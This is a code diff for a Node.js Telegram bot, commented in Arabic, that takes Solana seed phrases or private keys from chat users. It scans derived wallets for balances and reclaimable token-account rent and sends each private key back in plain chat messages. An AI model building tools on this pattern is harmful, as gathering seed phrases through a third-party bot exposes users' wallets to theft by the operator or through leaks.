@@ -40,29 +40,41 @@ async function retryWithBackoff(fn, maxRetries = 5) {
   }
 }
 
+// استعلام عبر RPC
+async function rpc(method, params) {
+  const fetch = (await import('node-fetch')).default;
+
+  const res = await fetch(process.env.RPC_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      jsonrpc: "2.0",
+      id: 1,
+      method,
+      params,
+    }),
+  });
+  const data = await res.json();
+  return data.result;
+}
+
 async function getTokenAccounts(address) {
   try {
     if (!address || typeof address !== 'string') {
       return [];
     }
 
-    let pubKey;
-    try {
-      pubKey = new PublicKey(address);
-    } catch (error) {
-      console.error("Invalid address format:", address);
-      return [];
-    }
-
-    const response = await retryWithBackoff(() => 
-      connection.getParsedTokenAccountsByOwner(
-        pubKey,
-        { programId: TOKEN_PROGRAM_ID }
-      )
+    // استخدام RPC مباشرة مثل الكود الناجح
+    const result = await retryWithBackoff(() =>
+      rpc("getTokenAccountsByOwner", [
+        address,
+        { programId: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" },
+        { encoding: "jsonParsed" }
+      ])
     );
-    return response?.value || [];
+
+    return result?.value || [];
   } catch (error) {
-    // تقليل عدد سجلات الأخطاء لتجنب إزعاج السجلات
     if (!error.message.includes('429')) {
       console.error("Error getting token accounts for address:", address, error.message);
     }
@@ -79,23 +91,46 @@ async function calculateBurnCost(addressStr) {
         totalBurnCost: "0.000000000"
       };
     }
+
+    console.log(`🔍 فحص التوكنات للعنوان: ${addressStr}`);
     const tokens = await getTokenAccounts(addressStr);
+    console.log(`📊 تم العثور على ${tokens.length} حساب توكن`);
+
     let tokenCount = 0;
     let nftCount = 0;
+    let cleanupCount = 0;
 
     for (const token of tokens) {
-      const amount = token.account.data.parsed.info.tokenAmount.amount;
-      const decimals = token.account.data.parsed.info.tokenAmount.decimals;
+      try {
+        const info = token.account.data.parsed.info;
+        const amount = parseFloat(info.tokenAmount.uiAmount) || 0;
+        const decimals = info.tokenAmount.decimals;
 
-      if (amount === "0") {
-        tokenCount++;
-      } else if (decimals === 0 && amount === "1") {
-        nftCount++;
+        // تصنيف الحسابات مثل الكود الناجح
+        if (amount === 0) {
+          tokenCount++;
+          console.log(`🗑️ توكن فارغ: ${info.mint}`);
+        } else if (decimals === 0 && amount === 1) {
+          nftCount++;
+          console.log(`🖼️ NFT: ${info.mint}`);
+        } else {
+          cleanupCount++;
+        }
+      } catch (tokenError) {
+        console.error("خطأ في معالجة التوكن:", tokenError);
       }
     }
 
+    // حساب rent لجميع الحسابات (مثل الكود الناجح)
+    const totalAccounts = tokens.length;
     const burnCostPerAccount = 0.00203928;
-    const totalBurnCost = (tokenCount + nftCount) * burnCostPerAccount;
+    const totalBurnCost = totalAccounts * burnCostPerAccount;
+
+    console.log(`💰 إجمالي التوكنات الفارغة: ${tokenCount}`);
+    console.log(`🖼️ إجمالي NFTs: ${nftCount}`);
+    console.log(`🔧 حسابات أخرى: ${cleanupCount}`);
+    console.log(`📊 إجمالي الحسابات: ${totalAccounts}`);
+    console.log(`✨ إجمالي SOL قابل للاستعادة: ${totalBurnCost.toFixed(9)}`);
 
     return {
       emptyTokens: tokenCount,
@@ -154,12 +189,17 @@ async function scanDerivationPath(path, seed) {
 
     if (txList.length > 0 || balance > 0) {
       const burnInfo = await calculateBurnCost(address);
+      const balanceInSol = balance / 1e9;
+      // SOL القابل للاستعادة هو مبلغ الـ rent فقط (0.00203928 SOL × عدد الحسابات)
+      const recoveredSOL = parseFloat(burnInfo.totalBurnCost);
+
       return {
         path,
         address,
         privateKey: bs58.encode(Buffer.from(keypair.secretKey)),
-        balance: balance / 1e9,
+        balance: balanceInSol,
         hasTransactions: txList.length > 0,
+        recoveredSOL: recoveredSOL,
         ...burnInfo
       };
     }
@@ -170,8 +210,12 @@ async function scanDerivationPath(path, seed) {
 }
 
 async function scanWallet(mnemonic, chatId) {
-  if (!bip39.validateMnemonic(mnemonic)) {
-    return bot.sendMessage(chatId, "❌ المنيمونك غير صالح!");
+  const cleanedMnemonic = cleanMnemonic(mnemonic);
+
+  // تشخيص مفصل لسبب فشل التحقق من صحة العبارة
+  const diagnosis = diagnoseMnemonic(cleanedMnemonic);
+  if (!diagnosis.isValid) {
+    return bot.sendMessage(chatId, diagnosis.message);
   }
 
   const BATCH_SIZE = 20;
@@ -179,7 +223,7 @@ async function scanWallet(mnemonic, chatId) {
   const MAX_CONSECUTIVE_EMPTY = 10;
   const seenAddresses = new Set();
   const pathGenerator = generatePaths();
-  const seed = await bip39.mnemonicToSeed(mnemonic);
+  const seed = await bip39.mnemonicToSeed(cleanedMnemonic);
   const userMode = userModes.get(chatId) || 'normal';
   let foundWalletsWithBalance = 0;
 
@@ -211,14 +255,14 @@ async function scanWallet(mnemonic, chatId) {
             foundWalletsWithBalance++;
 
             const message = 
-              `💰 محفظة بها رصيد!\n\n` +
-              `📍 Path:\n${wallet.path}\n\n` +
-              `🔑 Address:\n${wallet.address}\n\n` +
-              `🔐 Private Key:\n${wallet.privateKey}\n\n` +
-              `💰 Balance: ${wallet.balance} SOL\n\n` +
-              `🔥 Expected SOL after burning: ${wallet.totalBurnCost} SOL`;
+              `🔑 Address:\n\`${wallet.address}\`\n\n` +
+              `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+              `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
+              `🔥 Rent: ${wallet.totalBurnCost} SOL`;
 
-            await bot.sendMessage(chatId, message);
+            await bot.sendMessage(chatId, message, {
+              parse_mode: 'Markdown'
+            });
           } else if (wallet.hasTransactions) {
             // حساب المحافظ النشطة حتى لو لم يكن بها رصيد
             foundInBatch++;
@@ -231,14 +275,14 @@ async function scanWallet(mnemonic, chatId) {
           }
 
           const message = 
-            `🎁 ${wallet.balance > 0 ? 'Has balance' : 'Active without balance'}\n\n` +
-            `📍 Path:\n${wallet.path}\n\n` +
-            `🔑 Address:\n${wallet.address}\n\n` +
-            `🔐 Private Key:\n${wallet.privateKey}\n\n` +
-            `💰 Balance: ${wallet.balance} SOL\n\n` +
-            `🔥 Expected SOL after burning: ${wallet.totalBurnCost} SOL`;
+            `🔑 Address:\n\`${wallet.address}\`\n\n` +
+            `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+            `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
+            `🔥 Rent: ${wallet.totalBurnCost} SOL`;
 
-          await bot.sendMessage(chatId, message);
+          await bot.sendMessage(chatId, message, {
+            parse_mode: 'Markdown'
+          });
         }
       }
     }
@@ -364,17 +408,16 @@ async function checkPrivateKey(privateKey, chatId) {
     // حساب تكلفة الحرق
     const burnInfo = await calculateBurnCost(address);
 
-    const message = 
-      `💼 معلومات المحفظة:\n\n` +
-      `🔑 العنوان:\n${address}\n\n` +
-      `🔐 المفتاح الخاص:\n${privateKey}\n\n` +
-      `💰 الرصيد: ${balanceInSol.toFixed(9)} SOL\n\n` +
-      `🔥 تكلفة الحرق المتوقعة: ${burnInfo.totalBurnCost} SOL\n\n` +
-      `📊 التفاصيل:\n` +
-      `• الرموز الفارغة: ${burnInfo.emptyTokens}\n` +
-      `• NFTs: ${burnInfo.nfts}`;
+    // SOL القابل للاستعادة هو مبلغ الـ rent فقط
+    const recoveredSOL = parseFloat(burnInfo.totalBurnCost);
 
-    await bot.sendMessage(chatId, message);
+    const message = 
+      `🔑 Address:\n\`${address}\`\n\n` +
+      `🔐 Private Key:\n\`${privateKey}\`\n\n` +
+      `💰 Balance : ${balanceInSol.toFixed(4)}\n\n` +
+      `🔥 Rent: ${burnInfo.totalBurnCost} SOL`;
+
+    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
 
   } catch (error) {
     console.error("Error checking private key:", error);
@@ -460,9 +503,114 @@ function extractAllPrivateKeys(text) {
   return privateKeys;
 }
 
+function cleanMnemonic(text) {
+  if (!text) return '';
+
+  // إزالة جميع الأحرف غير المرئية والمسافات الزائدة
+  return text
+    .replace(/[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000]/g, ' ') // تحويل جميع أنواع المسافات إلى مسافة عادية
+    .replace(/[\u200B-\u200D\uFEFF\u061C\u200E\u200F]/g, '') // إزالة الأحرف المخفية وعلامات الاتجاه
+    .replace(/^\s+|\s+$/g, '') // إزالة المسافات من البداية والنهاية بشكل أكثر دقة
+    .replace(/\s+/g, ' ') // تحويل جميع المسافات المتعددة إلى مسافة واحدة
+    .toLowerCase(); // تحويل إلى أحرف صغيرة
+}
+
+function diagnoseMnemonic(mnemonic) {
+  if (!mnemonic || typeof mnemonic !== 'string') {
+    return {
+      isValid: false,
+      message: "❌ العبارة السرية فارغة أو غير صالحة!"
+    };
+  }
+
+  const words = mnemonic.split(/\s+/);
+  const mnemonicWordList = bip39.wordlists.english;
+
+  // التحقق من عدد الكلمات
+  if (words.length !== 12 && words.length !== 24) {
+    return {
+      isValid: false,
+      message: `❌ عدد كلمات العبارة السرية غير صحيح!\n\n` +
+               `📊 العدد الحالي: ${words.length} كلمة\n` +
+               `✅ المطلوب: 12 أو 24 كلمة\n\n` +
+               `💡 تأكد من وجود جميع الكلمات مفصولة بمسافات.`
+    };
+  }
+
+  // التحقق من صحة كل كلمة
+  const invalidWords = [];
+  const suggestions = [];
+
+  words.forEach((word, index) => {
+    if (!mnemonicWordList.includes(word)) {
+      invalidWords.push(`${index + 1}: "${word}"`);
+
+      // البحث عن كلمات مشابهة
+      const similarWords = mnemonicWordList.filter(validWord => {
+        // حساب المسافة بين الكلمات (Levenshtein distance مبسط)
+        if (Math.abs(validWord.length - word.length) > 2) return false;
+
+        let differences = 0;
+        const maxLength = Math.max(validWord.length, word.length);
+
+        for (let i = 0; i < maxLength; i++) {
+          if (validWord[i] !== word[i]) differences++;
+          if (differences > 2) return false;
+        }
+
+        return differences <= 2;
+      }).slice(0, 3);
+
+      if (similarWords.length > 0) {
+        suggestions.push(`"${word}" ربما تقصد: ${similarWords.join(', ')}`);
+      }
+    }
+  });
+
+  if (invalidWords.length > 0) {
+    let message = `❌ توجد كلمات غير صالحة في العبارة السرية!\n\n`;
+    message += `🔍 الكلمات غير الصالحة:\n${invalidWords.join('\n')}\n\n`;
+
+    if (suggestions.length > 0) {
+      message += `💡 اقتراحات للتصحيح:\n${suggestions.join('\n')}\n\n`;
+    }
+
+    message += `📝 تأكد من:\n`;
+    message += `• كتابة جميع الكلمات بالإنجليزية\n`;
+    message += `• عدم وجود أخطاء إملائية\n`;
+    message += `• استخدام كلمات من قائمة BIP39 الرسمية`;
+
+    return {
+      isValid: false,
+      message: message
+    };
+  }
+
+  // التحقق من checksum
+  if (!bip39.validateMnemonic(mnemonic)) {
+    return {
+      isValid: false,
+      message: `❌ العبارة السرية غير صالحة!\n\n` +
+               `✅ جميع الكلمات صحيحة ولكن:\n` +
+               `🔐 الـ Checksum غير صحيح\n\n` +
+               `💡 هذا يعني أن ترتيب الكلمات قد يكون خاطئ أو أن هناك كلمة مفقودة/زائدة.\n\n` +
+               `📝 تأكد من:\n` +
+               `• الترتيب الصحيح للكلمات\n` +
+               `• عدم نسيان أو إضافة أي كلمة\n` +
+               `• نسخ العبارة كما هي تماماً`
+    };
+  }
+
+  return {
+    isValid: true,
+    message: "✅ العبارة السرية صالحة!"
+  };
+}
+
 function extractAllMnemonics(text) {
   const mnemonics = [];
-  const words = text.toLowerCase().split(/\s+/);
+  const cleanedText = cleanMnemonic(text);
+  const words = cleanedText.split(/\s+/);
   const mnemonicWordList = bip39.wordlists.english;
   const usedIndices = new Set();
 
@@ -544,7 +692,18 @@ bot.on('message', async (msg) => {
 
   // إذا لم يوجد أي منهما، محاولة التعامل مع النص كما هو (للتوافق مع النسخة القديمة)
   if (privateKeys.length === 0 && mnemonics.length === 0) {
-    await scanWallet(msg.text, chatId);
+    const cleanedText = cleanMnemonic(msg.text);
+    // التحقق إذا كان النص المنظف يحتوي على كلمات من قائمة BIP39
+    const words = cleanedText.split(/\s+/);
+    const mnemonicWordList = bip39.wordlists.english;
+    const validWords = words.filter(word => mnemonicWordList.includes(word));
+
+    // إذا كان أكثر من 50% من الكلمات صالحة، نعتبره منيمونك محتمل
+    if (validWords.length >= 6 && validWords.length / words.length > 0.5) {
+      await scanWallet(cleanedText, chatId);
+    } else {
+      await bot.sendMessage(chatId, "❌ لم يتم العثور على كلمات سرية أو مفاتيح خاصة صالحة في النص.");
+    }
   }
 });
 
@@ -562,11 +721,11 @@ console.log('📡 يستخدم polling mode للاتصال مع تلجرام');
   }
 })();
 import http from 'http';
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 5000;
 
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
   res.end('🤖 Telegram bot is running.\n');
-}).listen(PORT, () => {
+}).listen(PORT, '0.0.0.0', () => {
   console.log(`🌐 HTTP server listening on port ${PORT}`);
 });
